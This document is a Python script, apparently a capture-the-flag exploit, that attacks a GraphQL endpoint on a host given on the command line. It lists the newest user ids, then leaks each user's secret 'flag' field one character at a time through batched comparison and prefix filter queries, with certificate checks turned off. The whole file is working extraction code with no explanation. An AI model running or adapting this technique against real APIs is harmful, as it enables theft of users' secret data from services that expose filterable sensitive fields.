import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

s = requests.session()

HOST = sys.argv[1]
FLAG_PREFIX = sys.argv[2]

def get_next_chars(flags):
  flag_ids = list(flags)

  query = "query {"
  for pos, user_id in enumerate(flag_ids):
    letter = chr(ord("A") + pos)
    start = flags[user_id]
    query += f'{letter}{1}:users(where:{{id:{{equals:"{user_id}"}},flag:{{lt:"{start}9"}}}}){{id}}'
    query += f'{letter}{2}:users(where:{{id:{{equals:"{user_id}"}},flag:{{lt:"{start}I"}}}}){{id}}'
    query += f'{letter}{3}:users(where:{{id:{{equals:"{user_id}"}},flag:{{lt:"{start}R"}}}}){{id}}'
  query += "}"

  json_data = {"query": query}
  ans = s.post(f"https://{HOST}:443/api/graphql", json=json_data, verify=False).json()["data"]

  user_id_to_abc = {}

  for pos, user_id in enumerate(flag_ids):
    letter = chr(ord("A") + pos)

    if ans[letter+"1"]:
      abc = "012345678"
    elif ans[letter+"2"]:
      abc = "9ABCDEFGH"
    elif ans[letter+"3"]:
      abc = "IJKLMNOPQ"
    else:
      abc = "RSTUVWXYZ"

    user_id_to_abc[user_id] = abc

  query = "query{"
  for pos, user_id in enumerate(flag_ids):
    letter = chr(ord("A") + pos)
    abc = user_id_to_abc[user_id]
    start = flags[user_id]
    for c in abc[:-1]:
      query += f'{letter}{c}:users(where:{{id:{{equals:"{user_id}"}},flag:{{startsWith:"{start}{c}"}}}}){{id}}'
  query += "}"

  json_data = {"query": query}

  ans = s.post(f"https://{HOST}:443/api/graphql", json=json_data, verify=False).json()["data"]
  ans = [a for a in ans if ans[a]]

  for pos, user_id in enumerate(flag_ids):
    abc = user_id_to_abc[user_id]
    letter = chr(ord("A") + pos)

    char = abc[-1]
    for c in abc:
      if letter + c in ans:
        char = c
        break

    flags[user_id] += char


def print_flags_by_ids(flag_ids):
  flags = {flag_id: FLAG_PREFIX for flag_id in flag_ids}
  for i in range(len(FLAG_PREFIX), len(FLAG_PREFIX)+32):
    get_next_chars(flags)

  for flag in flags.values():
    print(flag)


def get_id_list():
  json_data = {
    "query":"query{users(take:8,orderBy:{createdAt:desc}){id}}"
  }

  items = s.post(f"https://{HOST}:{443}/api/graphql", json=json_data, verify=False).json()["data"]["users"]

  id_list = [i["id"] for i in items]

  return id_list

user_ids = get_id_list()
print_flags_by_ids(user_ids)
